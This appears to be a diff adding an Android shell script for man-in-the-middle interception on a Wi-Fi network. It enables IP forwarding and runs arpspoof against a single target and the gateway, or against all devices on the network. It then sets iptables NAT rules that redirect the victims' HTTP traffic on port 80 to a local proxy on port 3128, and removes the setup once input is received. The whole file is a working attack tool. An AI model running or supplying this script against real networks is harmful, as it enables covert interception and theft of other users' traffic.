@@ -1,0 +1,61 @@
+#!/system/bin/sh
+# When this script the following are set by the . command:
+# WLAN, IP, SUBNET, MASK, SHORTMASK
+# ARPSPOOF, IPTABLES
+. $1
+shift
+
+# Detect a few settings
+
+echo Current Wifi IP: $IP
+echo Current subnet: $SUBNET
+echo Subnet mask: $MASK
+
+echo Enabling ip_forward
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+if [ "$1" = "all" ]
+then
+	echo "Starting ARP Spoofing for all devices"
+	echo arpspoof -i $WLAN "$2"
+	$ARPSPOOF -i $WLAN "$2" 2>&1 >/dev/null &
+	ARP1="$!"
+elif [ "$1" == "none" ]
+then
+	echo "Not arpspoofing at all."
+else
+	echo "Starting ARP Spoofing"
+	echo arpspoof -i $WLAN -t "$1" "$2"
+	$ARPSPOOF -i $WLAN -t "$1" "$2" 2>&1 >/dev/null &
+	ARP1="$!"
+	echo arpspoof -i $WLAN -t "$2" "$1"
+	$ARPSPOOF -i $WLAN -t "$2" "$1" 2>&1 >/dev/null &
+	ARP2="$!"
+fi
+
+echo iptables -P FORWARD ACCEPT # Android 4.0 requires this
+echo iptables -t nat -A POSTROUTING -j MASQUERADE
+echo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+
+
+$IPTABLES -P FORWARD ACCEPT # Android 4.0 requires this
+$IPTABLES -t nat -A POSTROUTING -j MASQUERADE
+$IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+
+# Wait for finish
+read
+
+echo "Killing arpspoof"
+kill $ARP1 2>/dev/null
+kill $ARP2 2>/dev/null
+
+# Stop stuff
+
+echo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+echo iptables -t nat -D POSTROUTING -j MASQUERADE
+
+$IPTABLES -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+$IPTABLES -t nat -D POSTROUTING -j MASQUERADE
+
+
+wait
